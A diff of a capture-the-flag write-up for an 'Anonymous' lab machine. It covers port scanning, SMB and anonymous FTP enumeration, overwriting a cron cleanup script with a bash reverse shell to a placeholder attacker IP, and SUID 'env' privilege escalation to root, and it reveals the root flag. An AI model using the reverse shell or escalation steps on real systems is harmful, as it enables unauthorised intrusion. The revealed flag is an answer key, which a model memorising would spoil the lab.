@@ -5,7 +5,7 @@
 
 Nmap / rustcan
 
-```shell
+```zsh
 IP=VICTIM
 rustscan -a $IP | tee rustscan.log
 [...]
@@ -26,7 +26,7 @@ PORT    STATE SERVICE      REASON
 - What service is running on ports 139 and 445?
 **smb**
 
-```shell
+```zsh
 smbclient -L $IP (without any password)
 
 Enter WORKGROUP\root's password: 
@@ -36,7 +36,6 @@ Enter WORKGROUP\root's password:
 	print$          Disk      Printer Drivers
 	pics            Disk      My SMB Share Directory for Pics
 	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
-SMB1 disabled -- no workgroup available
 
 ```
 
@@ -45,7 +44,7 @@ SMB1 disabled -- no workgroup available
 
 > HINT: What's that log file doing there?... nc won't work the way you'd expect it to
 
-```shell
+```zsh
 ftp $IP
 
 Name: anonymous
@@ -63,7 +62,7 @@ ftp> mget *
 ```
 Let's cat each files: 
 
-```shell
+```zsh
 cat clean.sh 
 #!/bin/bash
 
@@ -78,14 +77,14 @@ else
 fi
 ```
 
-```shell
+```zsh
 cat removed_files.log 
 Running cleanup script:  nothing to delete
 Running cleanup script:  nothing to delete
 Running cleanup script:  nothing to delete
 ```
 
-```shell
+```zsh
 cat to_do.txt        
 I really need to disable the anonymous login...it's really not safe
 ```
@@ -94,7 +93,7 @@ I really need to disable the anonymous login...it's really not safe
 
 So let's have fun by uploading this reverse shell via ftp now:
 
-```shell
+```zsh
 cat clean.sh
 
 #!/bin/bash
@@ -103,7 +102,7 @@ bash -i >& /dev/tcp/<AttackerIp>/4242 0>&1
 
 And after few seconds we are in :
 
-```shell
+```zsh
 rlwrap nc -nlvp 4242
 listening on [any] 4242
 namelessone@anonymous:~$ 
@@ -128,7 +127,7 @@ namelessone@anonymous:~$
 
 Cool ! So as usual in this case, [gtfobins](https://gtfobins.github.io/) comes in :point_left:
 
-```shell
+```zsh
 find / -perm -u=s 2>/dev/null
 [...]
 /usr/bin/env
@@ -136,12 +135,12 @@ find / -perm -u=s 2>/dev/null
 
 So let's try this: [gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/env/#shell)
 
-```shell
+```zsh
 env /bin/bash -p
 bash-4.4# id
 uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 cat /root/root.txt
-4d9<Redacted>363
+4d930091[Redacted]f27999af363
 bash-4.4# 
 
 ```
@@ -151,7 +150,7 @@ Houra :partying_face:
 <details>
   <summary>Click to reveal the root flag!</summary>
   
-  ```bash
+  ```zsh
   4d930091c31a622a7ed10f27999af363
   ```
 </details>
